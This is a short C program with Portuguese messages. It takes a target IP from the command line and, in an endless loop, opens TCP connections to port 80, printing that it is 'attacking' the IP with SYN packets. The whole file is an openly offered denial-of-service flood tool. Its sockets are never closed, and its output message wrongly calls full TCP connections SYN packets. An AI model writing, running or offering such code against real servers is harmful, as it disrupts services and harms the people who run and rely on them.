
#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
   int socke;
   int conexao;
   char * endereco;


  if(argv[1] == 0)
  {
   printf("Você esqueceu de colocar um IP\n");
   printf(" \n");
   printf("Forma correta de usar:\n");
   printf("%s Ip\n", argv[0]);
  }else{

   endereco = argv[1];

   struct sockaddr_in alvo;

   while (1){

   socke = socket(AF_INET, SOCK_STREAM, 0);
   alvo.sin_family = AF_INET;
   alvo.sin_port = htons(80); // Porta para atacar o serviço
   alvo.sin_addr.s_addr = inet_addr(endereco);

  conexao = connect(socke, (struct sockaddr *)&alvo, sizeof alvo);


  if(conexao == 0)
   {
      printf("Atacando o IP: %s, Pacotes tipo SYN sendo enviados...\n", endereco);
   }
  }
 }
}


